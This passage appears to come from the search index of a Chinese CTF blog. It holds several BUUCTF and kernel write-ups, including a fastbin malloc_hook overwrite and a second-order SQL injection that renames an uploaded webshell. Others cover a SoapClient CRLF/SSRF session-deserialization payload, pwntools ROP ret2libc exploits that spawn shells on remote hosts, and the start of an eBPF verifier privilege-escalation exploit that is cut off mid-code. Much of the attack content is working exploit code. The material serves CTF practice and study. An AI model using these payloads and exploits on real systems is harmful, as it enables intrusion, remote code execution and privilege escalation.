3edit(3, 0x9, p64(malloc_hook-0x20+5-8))create(0x60)  # 6create(0x60)  # 7create(0x60)  # 8payload = b&#x27;a&#x27;*(0x20-5-8)+p64(one_gadget)info(hex(one_gadget))edit(8, len(payload), payload)# gdb.attach(r)create(1)r.interactive()\n\n","categories":["pwn-buuctf"],"tags":["fastbin attack"]},{"title":"XDCTF_2015_filemanager","url":"/2021/12/06/XDCTF-2015-filemanager/","content":"信息搜集扫描出来网站有源码泄漏www.tar.xz\n代码审计index.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午7:46 */?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;file manage&lt;/title&gt;    &lt;base href=&quot;./&quot;&gt;    &lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt;&lt;body&gt;    &lt;h3&gt;Control&lt;/h3&gt;    &lt;ul style=&quot;list-style: none;&quot;&gt;        &lt;li&gt;&lt;a href=&quot;./delete.php&quot;&gt;Delete file&lt;/a&gt;&lt;/li&gt;        &lt;li&gt;&lt;a href=&quot;./rename.php&quot;&gt;Rename file&lt;/a&gt;&lt;/li&gt;    &lt;/ul&gt;    &lt;h3&gt;Content&lt;/h3&gt;    &lt;form action=&quot;./upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;        &lt;input type=&quot;file&quot; name=&quot;upfile&quot;&gt;        &lt;input type=&quot;submit&quot; value=&quot;upload file&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\nupload.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午8:45 */require_once &quot;common.inc.php&quot;;if ($_FILES) &#123;\t$file = $_FILES[&quot;upfile&quot;];\tif ($file[&quot;error&quot;] == UPLOAD_ERR_OK) &#123;\t\t$name = basename($file[&quot;name&quot;]);\t\t$path_parts = pathinfo($name);\t\tif (!in_array($path_parts[&quot;extension&quot;], array(&quot;gif&quot;, &quot;jpg&quot;, &quot;png&quot;, &quot;zip&quot;, &quot;txt&quot;))) &#123;\t\t\texit(&quot;error extension&quot;);\t\t&#125;\t\t$path_parts[&quot;extension&quot;] = &quot;.&quot; . $path_parts[&quot;extension&quot;];\t\t$name = $path_parts[&quot;filename&quot;] . $path_parts[&quot;extension&quot;];\t\t// $path_parts[&quot;filename&quot;] = $db-&gt;quote($path_parts[&quot;filename&quot;]);\t\t// Fix\t\t$path_parts[&#x27;filename&#x27;] = addslashes($path_parts[&#x27;filename&#x27;]);\t\t$sql = &quot;select * from `file` where `filename`=&#x27;&#123;$path_parts[&#x27;filename&#x27;]&#125;&#x27; and `extension`=&#x27;&#123;$path_parts[&#x27;extension&#x27;]&#125;&#x27;&quot;;\t\t$fetch = $db-&gt;query($sql);\t\tif ($fetch-&gt;num_rows &gt; 0) &#123;\t\t\texit(&quot;file is exists&quot;);\t\t&#125;\t\tif (move_uploaded_file($file[&quot;tmp_name&quot;], UPLOAD_DIR . $name)) &#123;\t\t\t$sql = &quot;insert into `file` ( `filename`, `view`, `extension`) values( &#x27;&#123;$path_parts[&#x27;filename&#x27;]&#125;&#x27;, 0, &#x27;&#123;$path_parts[&#x27;extension&#x27;]&#125;&#x27;)&quot;;\t\t\t$re = $db-&gt;query($sql);\t\t\tif (!$re) &#123;\t\t\t\tprint_r($db-&gt;error);\t\t\t\texit;\t\t\t&#125;\t\t\t$url = &quot;/&quot; . UPLOAD_DIR . $name;\t\t\techo &quot;Your file is upload, url:                &lt;a href=\\&quot;&#123;$url&#125;\\&quot; target=&#x27;_blank&#x27;&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;                &lt;a href=\\&quot;/\\&quot;&gt;go back&lt;/a&gt;&quot;;\t\t&#125; else &#123;\t\t\texit(&quot;upload error&quot;);\t\t&#125;\t&#125; else &#123;\t\tprint_r(error_get_last());\t\texit;\t&#125;&#125;\n\ncommon.inc.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午7:58 */$DATABASE = array(\t&quot;host&quot; =&gt; &quot;127.0.0.1&quot;,\t&quot;username&quot; =&gt; &quot;tcdy&quot;,\t&quot;password&quot; =&gt; &quot;1&quot;,\t&quot;dbname&quot; =&gt; &quot;xdctf&quot;,);$db = new mysqli($DATABASE[&#x27;host&#x27;], $DATABASE[&#x27;username&#x27;], $DATABASE[&#x27;password&#x27;], $DATABASE[&#x27;dbname&#x27;]);$req = array();foreach (array($_GET, $_POST, $_COOKIE) as $global_var) &#123;\tforeach ($global_var as $key =&gt; $value) &#123;\t\tis_string($value) &amp;&amp; $req[$key] = addslashes($value);\t&#125;&#125;define(&quot;UPLOAD_DIR&quot;, &quot;upload/&quot;);function redirect($location)&#123;\theader(&quot;Location: &#123;$location&#125;&quot;);\texit;&#125;\n\ndelete.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午9:39 */require_once &quot;common.inc.php&quot;;if(isset($req[&#x27;filename&#x27;])) &#123;    $result = $db-&gt;query(&quot;select * from `file` where `filename`=&#x27;&#123;$req[&#x27;filename&#x27;]&#125;&#x27;&quot;);    if ($result-&gt;num_rows&gt;0)&#123;        $result = $result-&gt;fetch_assoc();    &#125;    $filename = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;];    if ($result &amp;&amp; file_exists($filename)) &#123;        $db-&gt;query(&#x27;delete from `file` where `fid`=&#x27; . $result[&quot;fid&quot;]);        unlink($filename);        redirect(&quot;/&quot;);    &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;file manage&lt;/title&gt;    &lt;base href=&quot;/&quot;&gt;    &lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt;&lt;h3&gt;Delete file&lt;/h3&gt;&lt;body&gt;    &lt;form method=&quot;post&quot;&gt;        &lt;p&gt;            &lt;span&gt;delete filename(exclude extension)：&lt;/span&gt;            &lt;input type=&quot;text&quot; name=&quot;filename&quot;&gt;        &lt;/p&gt;        &lt;p&gt;            &lt;input type=&quot;submit&quot; value=&quot;delete&quot;&gt;        &lt;/p&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\nrename.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午9:39 */require_once &quot;common.inc.php&quot;;if (isset($req[&#x27;oldname&#x27;]) &amp;&amp; isset($req[&#x27;newname&#x27;])) &#123;\t$result = $db-&gt;query(&quot;select * from `file` where `filename`=&#x27;&#123;$req[&#x27;oldname&#x27;]&#125;&#x27;&quot;);\tif ($result-&gt;num_rows &gt; 0) &#123;\t\t$result = $result-&gt;fetch_assoc();\t&#125; else &#123;\t\texit(&quot;old file doesn&#x27;t exists!&quot;);\t&#125;\tif ($result) &#123;\t\t$req[&#x27;newname&#x27;] = basename($req[&#x27;newname&#x27;]);\t\t$sql = &quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;;\t\t$re = $db-&gt;query(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;);\t\tif (!$re) &#123;\t\t\tprint_r($db-&gt;error);\t\t\texit;\t\t&#125;\t\t$oldname = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;];\t\t$newname = UPLOAD_DIR . $req[&quot;newname&quot;] . $result[&quot;extension&quot;];\t\tif (file_exists($oldname)) &#123;\t\t\trename($oldname, $newname);\t\t&#125;\t\t$url = &quot;/&quot; . $newname;\t\techo &quot;Your file is rename, url:                &lt;a href=\\&quot;&#123;$url&#125;\\&quot; target=&#x27;_blank&#x27;&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;                &lt;a href=\\&quot;/\\&quot;&gt;go back&lt;/a&gt;&quot;;\t&#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;\t&lt;title&gt;file manage&lt;/title&gt;\t&lt;base href=&quot;/&quot;&gt;\t&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt;&lt;h3&gt;Rename&lt;/h3&gt;&lt;body&gt;\t&lt;form method=&quot;post&quot;&gt;\t\t&lt;p&gt;\t\t\t&lt;span&gt;old filename(exclude extension)：&lt;/span&gt;\t\t\t&lt;input type=&quot;text&quot; name=&quot;oldname&quot;&gt;\t\t&lt;/p&gt;\t\t&lt;p&gt;\t\t\t&lt;span&gt;new filename(exclude extension)：&lt;/span&gt;\t\t\t&lt;input type=&quot;text&quot; name=&quot;newname&quot;&gt;\t\t&lt;/p&gt;\t\t&lt;p&gt;\t\t\t&lt;input type=&quot;submit&quot; value=&quot;rename&quot;&gt;\t\t&lt;/p&gt;\t&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n可以看到upload.php是不存在注入点的，由因为白名单限制没法上传一句话的文件。但是rename文件可以修改文件名。\nif ($result) &#123;    $req[&#x27;newname&#x27;] = basename($req[&#x27;newname&#x27;]);    $sql = &quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;;    $re = $db-&gt;query(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;);    if (!$re) &#123;        print_r($db-&gt;error);        exit;    &#125;    $oldname = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;];    $newname = UPLOAD_DIR . $req[&quot;newname&quot;] . $result[&quot;extension&quot;];    if (file_exists($oldname)) &#123;        rename($oldname, $newname);    &#125;    $url = &quot;/&quot; . $newname;    echo &quot;Your file is rename, url:                &lt;a href=\\&quot;&#123;$url&#125;\\&quot; target=&#x27;_blank&#x27;&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;                &lt;a href=\\&quot;/\\&quot;&gt;go back&lt;/a&gt;&quot;;&#125;\n\n这里对于oldname没有检查和处理，并且在下面是直接修改文件名字。描述起来比较费劲，就直接上图吧。\n\n构造一个文件名为&#39;,extension=&#39;&#39;,filename=&#39;wow.gif.gif的文件上传，两个gif是用第二个去逃避那个extension字段\n\n\n数据库和upload文件夹的结果就是这样\n现在去rename一个\n\n在rename里面的sql语句就是这样，那此时的extension就被置空了\n\n\n这时候上传一个一句话wow.gif\n\n\n\n现在数据储存的就是这样两个，下一步直接rename，修改木马尾缀\n\n此时就是将oldname修改到newname了，用蚁剑连接就好了\n","categories":["web-buuctf"],"tags":["二次注入"]},{"title":"bestphp's_revenge","url":"/2021/09/30/bestphp-s-revenge/","content":"这道题真不像看上去那样T_T\n先把源码附上\nindex.php\n&lt;?phphighlight_file(__FILE__);$b = &#x27;implode&#x27;;call_user_func($_GET[&#x27;f&#x27;], $_POST);session_start();if (isset($_GET[&#x27;name&#x27;])) &#123;    $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);call_user_func($b, $a);?&gt; \n\nflag.php\nsession_start(); echo &#x27;only localhost can get flag!&#x27;; $flag = &#x27;LCTF&#123;*************************&#125;&#x27;; if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;     $_SESSION[&#x27;flag&#x27;] = $flag; &#125; only localhost can get flag!\n\n\n\n知识点这道题需要的知识点很多\nSoapClient内置类SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。SoapClient类可以创建soap数据报文，与wsdl接口进行交互。\nhttps://www.anquanke.com/post/id/153065#h2-1\n\n第一个wsdl就是是否开启wsdl后面数组就是请求的一些参数。\n跟去其他wp可以看出来__call方法是可以进行请求达到ssrf的。\n其实我本身还不怎么知道这个东西，下去看一下，不过多介绍\n\nCRLF Injection漏洞CRLF就是指的是’\\r\\n’，在http协议就是根据两个连续的CRLF来分辨header和body的，在这个题当中可以控制user_agent进而控制cookie就行\n\ncall_user_func冷知识总所周知\n\n前面是回调函数，后面是参数。但是还有个冷知识就是\n\n在下面，可以调用类当中的方法。\nsession反序列化session反序列化不陌生，也就是key|反序列化的value，但是也会有其他的保存形式，也是因为用了不同的引擎反序列化的结果\n当 session.serialize_handler=php 时，session文件内容为： name|s:6:&quot;196082&quot;;\n当 session.serialize_handler=php_serialize 时，session文件为： a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;196082&quot;;&#125;\n当 session.serialize_handler=php_binary 时，session文件内容为： 二进制字符names:6:&quot;196082&quot;;\n也就是当开始使用php_serialize反序列化时(eg:$_SESSION[&#39;name&#39;]=&#39;|196082&#39;)\n结果\na:1:&#123;s:4:&quot;name&quot;;s:7:&quot;|196082&quot;;&#125;\n\n然后再用php引擎去解析这段的时候就被解析成\nkey:a:1:&#123;s:4:&quot;name&quot;;s:7:&quot;value:196082&quot;;&#125;\n\n然而value会被进行反序列化\n再就是php7当中session_start()函数可以接收一个数组参数，然后覆盖掉php.ini当中的配置，在这里可以用来更换引擎\n解题第一步就是将SoapClient反序列化写入到session文件当中\nexp.php\n&lt;?php$payload = new SoapClient(null, array(    &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php&#x27;,    &#x27;user_agent&#x27; =&gt; &quot;zzz\\r\\nCookie:PHPSESSID=na228cb7qlhrv6tjgb9k45v5e4&quot;,    &#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1&#x27;));$payload = serialize($payload);echo &#x27;|&#x27; . urlencode($payload);\n\n这里的PHPSESSID写自己的\n得到payload\n|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A16%3A%22http%3A%2F%2F127.0.0.1%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A48%3A%22zzz%0D%0ACookie%3APHPSESSID%3Dna228cb7qlhrv6tjgb9k45v5e4%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D\n\n\n将f复制成session_start然后POST传参然后覆盖掉php.ini的配置项，让序列化的引擎是php_serialize\n\n返回的数据表示我们写入成功了\n下面就是利用extract进行赋值，让$b=call_user_func这样就行成了array(reset($_SESSION),’welcome_to_the_lctf2018’)，因为并不存在welcome_to_the_lctf2018方法所以直接调用了call\n\n接下来注意上面的call_user_func的图片，其他wp都是说调用了SoapClient类当中的方法，但是我实在想不通，因为即便是上面这串payload被反序列化原本的内置类里面的参数也不受影响(我在这里卡了很久，不知到为什么其他师傅wp说调用了类的方法)，注意那里的题目中的reset函数，他是将指针指向数组第一个元素，这里也就是我们序列化的那串字符串，所以实际上这里调用的是反序列化得到的对象的方法，进行的ssrf\n然后直接在页面刷新\n\n获得flag\n总结，题目质量很高，涵盖了许多知识点，只不过我太菜了，就得地方卡了好久，下去还要好好看看相关内容。\n参考文章:https://www.cnblogs.com/NPFS/p/14335370.html\n","categories":["web-buuctf"],"tags":["session反序列化","php内置类SoapClint","call_user_func","CRLF Injection漏洞"]},{"title":"ciscn_2019_c_1","url":"/2021/09/19/ciscn-2019-c-1/","content":"获取基本信息\n\n然后进入ida进行分析\n分析程序// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+Ch] [rbp-4h]  init(*(_QWORD *)&amp;argc, argv, envp);  puts(&quot;EEEEEEE                            hh      iii                &quot;);  puts(&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;);  puts(&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;);  puts(&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;);  puts(&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;);  puts(&quot;====================================================================&quot;);  puts(&quot;Welcome to this Encryption machine\\n&quot;);  begin(&quot;Welcome to this Encryption machine\\n&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      fflush(0LL);      v4 = 0;      __isoc99_scanf(&quot;%d&quot;, &amp;v4);      getchar();      if ( v4 != 2 )        break;      puts(&quot;I think you can do it by yourself&quot;);      begin(&quot;I think you can do it by yourself&quot;);    &#125;    if ( v4 == 3 )    &#123;      puts(&quot;Bye!&quot;);      return 0;    &#125;    if ( v4 != 1 )      break;    encrypt();    begin(&quot;%d&quot;);  &#125;  puts(&quot;Something Wrong!&quot;);  return 0;&#125;\n\nint begin()&#123;  puts(&quot;====================================================================&quot;);  puts(&quot;1.Encrypt&quot;);  puts(&quot;2.Decrypt&quot;);  puts(&quot;3.Exit&quot;);  return puts(&quot;Input your choice!&quot;);&#125;\n\nint encrypt()&#123;  size_t v0; // rbx  char s[48]; // [rsp+0h] [rbp-50h]  __int16 v3; // [rsp+30h] [rbp-20h]  memset(s, 0, sizeof(s));  v3 = 0;  puts(&quot;Input your Plaintext to be encrypted&quot;);  gets(s);  while ( 1 )  &#123;    v0 = (unsigned int)x;    if ( v0 &gt;= strlen(s) )      break;    if ( s[x] &lt;= 96 || s[x] &gt; 122 )    &#123;      if ( s[x] &lt;= 64 || s[x] &gt; 90 )      &#123;        if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )          s[x] ^= 0xFu;      &#125;      else      &#123;        s[x] ^= 0xEu;      &#125;    &#125;    else    &#123;      s[x] ^= 0xDu;    &#125;    ++x;  &#125;  puts(&quot;Ciphertext&quot;);  return puts(s);&#125;\n\n发现只有encrypt存在栈溢出，所以就选1就好了。然后在encrypt函数里面我们是肯定不想自己的数据被处理，这样就会让辛辛苦苦的payload没了，所以就可以绕过，前面加一个’\\0’。\n发现程序并没有找到system函数和’/bin/sh’字符串，所以只能自己想办法调用了。\n攻击思路通过构造ROP执行puts打印出puts存在的真实地址==&gt;根据puts地址找到对应的libc文件==&gt;在libc文件中找到我们需要的函数和字符串==&gt;计算libc中函数和程序本身函数地址的偏移量==&gt;根据偏移量找到函数getshell\namd64函数的参数放在rdi,rsi,rdx,rcx,r8,r9当中，而i386函数的参数是直接寻址的。所以我们想要构建ROP就必须存在pop rdi;ret\n\n可以找到两个命令的地址为0x400c83。\n最终get_shellexp.py\nfrom pwn import *from LibcSearcher import *context(os=&#x27;Linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;DEBUG&#x27;)elf = ELF(&#x27;./questions/ciscn_2019_c_1&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 27809)plt_puts_addr = elf.plt[&#x27;puts&#x27;]got_puts_addr = elf.got[&#x27;puts&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]pop_rdi_addr = 0x400c83payload = b&#x27;\\0&#x27; + b&#x27;a&#x27; * (0x50 + 0x08 - 1) + p64(pop_rdi_addr) + \\    p64(got_puts_addr) + p64(plt_puts_addr) + p64(main_addr)r.recvuntil(b&#x27;Input your choice!\\n&#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;Input your Plaintext to be encrypted\\n&#x27;)r.sendline(payload)r.recvuntil(b&#x27;Ciphertext\\n&#x27;)r.recvuntil(b&#x27;\\n&#x27;)real_put_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=False)[:-1].ljust(8, b&#x27;\\0&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, real_put_addr)lib_puts_addr = libc.dump(&#x27;puts&#x27;)lib_system_addr = libc.dump(&#x27;system&#x27;)lib_shell_addr = libc.dump(&#x27;str_bin_sh&#x27;)offset = real_put_addr - lib_puts_addrreal_system_addr = lib_system_addr + offsetreal_shell_addr = lib_shell_addr + offsetret_addr = 0x4006b9payload = b&#x27;\\0&#x27; + b&#x27;a&#x27; * (0x50 + 0x08 - 1) + p64(ret_addr) + p64(pop_rdi_addr) + \\    p64(real_shell_addr) + p64(real_system_addr)print(&#x27;len-&gt;&#x27;, len(payload))r.recvuntil(b&#x27;Input your choice!\\n&#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;Input your Plaintext to be encrypted\\n&#x27;)r.sendline(payload)r.interactive()\n\n开始先获取puts在plt表的位置，然后获取puts在got表的位置(got表内部保存的是puts的真实地址)，然后获得程序main函数的地址\npayload1:    b&#x27;\\0&#x27; 用去绕过加密，这个长度为0所以会break掉\t然后填充垃圾字符实现栈溢出    将ret位置地址改为前面我们说的pop_rip;ret    再继续填充栈第一个写上puts参数也就是puts在got表的位置，因为我们要获取got表里面的实际位置    这个plt表用来ret，ret会将pop rip    最后一个就是执行完puts执行main函数payload2：\t有区别的就是p64(ret_addr)这是因为题目环境是ubuntu18所以要考虑到栈平衡\n\n","categories":["pwn-buuctf"],"tags":["ROP","stack overflow"]},{"title":"ciscn_2019_n_1","url":"/2021/09/18/ciscn-2019-n-1/","content":"获取文件基本信息\n\n\n发现是一个64位的程序，然后打开了NX保护(在栈上的内容不可执行)\n程序内容让我们猜数字\n分析程序程序的结构比较简单，直接使用gdb调试(主要是我使用gdb不是特别熟练所以想多用gdb让用起来熟练点)\n\n首先下断点到main函数然后运行程序\n\n然后可以看到会进入到一个函数名为func的函数\nida反汇编的func函数:\nint func()&#123;  int result; // eax  char v1; // [rsp+0h] [rbp-30h]  float v2; // [rsp+2Ch] [rbp-4h]  v2 = 0.0;  puts(&quot;Let&#x27;s guess the number.&quot;);  gets(&amp;v1);  if ( v2 == 11.28125 )    result = system(&quot;cat /flag&quot;);  else    result = puts(&quot;Its value should be 11.28125&quot;);  return result;&#125;\n\n\n\n\n是拿\n这个常量和v2作比较，然后这个常量的值为11.28125浮点型数据，无法用p64直接上成payload。但是浮点型在程序的存在形式也是16进制的形式所以在ida中找到这个地址所对应的值就可以拿去生成payload\n最后exp.py:\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/ciscn_2019_n_1&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 28839)payload = b&#x27;a&#x27;*(0x30-0x4) + p64(0x41348000)r.recvuntil(b&quot;Let&#x27;s guess the number.\\n&quot;)r.sendline(payload)r.interactive()\n\n","categories":["pwn-buuctf"],"tags":["pwn"]},{"title":"d3bpf-v2","url":"/2023/01/11/d3bpf-v2/","content":"因为近期一直在玩内核，在把这篇文章写完之后就不会一直更新内核相关的了，后续的打算是学习完逃逸的内容之后就开始进行刷题和复现比赛的练习了。\n分析题目首先，这道题的大致跟上一道题目一样，存在一个patch\ndiff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.cindex 40d92628e..be9cdde7a 100644--- a/kernel/bpf/verifier.c+++ b/kernel/bpf/verifier.c@@ -8100,11 +8100,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, \t\t\tscalar_min_max_lsh(dst_reg, &amp;src_reg); \t\tbreak; \tcase BPF_RSH:-\t\tif (umax_val &gt;= insn_bitness) &#123;-\t\t\t/* Shifts greater than 31 or 63 are undefined.-\t\t\t * This includes shifts by a negative number.-\t\t\t */-\t\t\tmark_reg_unknown(env, regs, insn-&gt;dst_reg);+\t\tif (umin_val &gt;= insn_bitness) &#123;+\t\t\tif (alu32)+\t\t\t\t__mark_reg32_known(dst_reg, 0);+\t\t\telse+\t\t\t\t__mark_reg_known_zero(dst_reg); \t\t\tbreak; \t\t&#125; \t\tif (alu32)\n\n可以看出来这里的patch跟前面一道题一样，在RSH中设置了超过指定大小的数时会设置为known的0。\n不同的是这里题目使用的内核版本是5.16.12+，而在新版本的内核中存在新的检测机制：\n\n  任何指针只能进行加减操作，不能进行比较（防止侧信道）\n  在进行指针与寄存器操作时，verfier会将已知的寄存器替换为常数进行计算。\n\n所以这也就造成了前面的攻击手法无效了。\n利用分析这里出现了一个新的函数bpf_skb_load_bytes可以进行绕过\nBPF_CALL_4(bpf_skb_load_bytes, const struct sk_buff *, skb, u32, offset,\t   void *, to, u32, len)&#123;\tvoid *ptr;\tif (unlikely(offset &gt; 0xffff))\t\tgoto err_clear;\tptr = skb_header_pointer(skb, offset, len, to);\tif (unlikely(!ptr))\t\tgoto err_clear;\tif (ptr != to)\t\tmemcpy(to, ptr, len);\treturn 0;err_clear:\tmemset(to, 0, len);\treturn -EFAULT;&#125;\n\n这个函数的作用是读取socket缓冲区到指定的位置，在ebpf程序中可以是栈或者map。\n然而因为patch的缘故我们可以很轻松的实现栈溢出。\n泄漏地址这里leak的方法延用作者的方法。\n在新版本内核中ebpf程序crash并不会造成内核的崩溃，当/proc/sys/kernel/panic_on_oops 值为 0 时 soft panic 并不会直接 panic。似乎在默认情况下其值就是 0，如 Ubuntu20.04。而在kernel pwn题目中想出现上述情况的方法是在qemu启动项中添加 oops = panic。而在发生soft panic时会打印出来内核地址。所以这里选择这样使用，使ebpf程序出现crash紧接着就会打印出地址即可。\n提权这里因为可以很简单的进行栈溢出所以就不多赘述了。所以直接给出exp\nexp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#include &lt;linux/bpf_common.h&gt;#include &lt;sys/types.h&gt;#include &lt;linux/bpf.h&gt;#ifndef _BPF_DEFS_H_#define _BPF_DEFS_H_#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \\    ((struct bpf_insn)&#123;                        \\        .code = CODE,                          \\        .dst_reg = DST,                        \\        .src_reg = SRC,                        \\        .off = OFF,                            \\        .imm = IMM&#125;)#define BPF_LD_IMM64_RAW(DST, SRC, IMM)              \\    ((struct bpf_insn)&#123;                              \\        .code = BPF_LD | BPF_DW | BPF_IMM,           \\        .dst_reg = DST,                              \\        .src_reg = SRC,                              \\        .off = 0,                                    \\        .imm = (__u32)(IMM)&#125;),                       \\        ((struct bpf_insn)&#123;                          \\            .code = 0, /* zero is reserved opcode */ \\            .dst_reg = 0,                            \\            .src_reg = 0,                            \\            .off = 0,                                \\            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)/* Memory load, dst_reg = *(uint *) (src_reg + off16) */#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \\    ((struct bpf_insn)&#123;                             \\        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \\        .dst_reg = DST,                             \\        .src_reg = SRC,                             \\        .off = OFF,                                 \\        .imm = 0&#125;)/* Memory store, *(uint *) (dst_reg + off16) = src_reg */#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \\    ((struct bpf_insn)&#123;                             \\        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \\        .dst_reg = DST,                             \\        .src_reg = SRC,                             \\        .off = OFF,                                 \\        .imm = 0&#125;)/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */#define BPF_JMP_IMM(OP, DST, IMM, OFF)        \\    ((struct bpf_insn)&#123;                       \\        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                       \\        .src_reg = 0,                         \\        .off = OFF,                           \\        .imm = IMM&#125;)/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */#define BPF_JMP32_IMM(OP, DST, IMM, OFF)        \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                         \\        .src_reg = 0,                           \\        .off = OFF,                             \\        .imm = IMM&#125;)/* Short form of mov, dst_reg = imm32 */#define BPF_MOV64_IMM(DST, IMM)              \\    ((struct bpf_insn)&#123;                      \\        .code = BPF_ALU64 | BPF_MOV | BPF_K, \\        .dst_reg = DST,                      \\        .src_reg = 0,                        \\        .off = 0,                            \\        .imm = IMM&#125;)#define BPF_MOV32_IMM(DST, IMM)            \\    ((struct bpf_insn)&#123;                    \\        .code = BPF_ALU | BPF_MOV | BPF_K, \\        .dst_reg = DST,                    \\        .src_reg = 0,                      \\        .off = 0,                          \\        .imm = IMM&#125;)/* Short form of mov, dst_reg = src_reg */#define BPF_MOV64_REG(DST, SRC)              \\    ((struct bpf_insn)&#123;                      \\        .code = 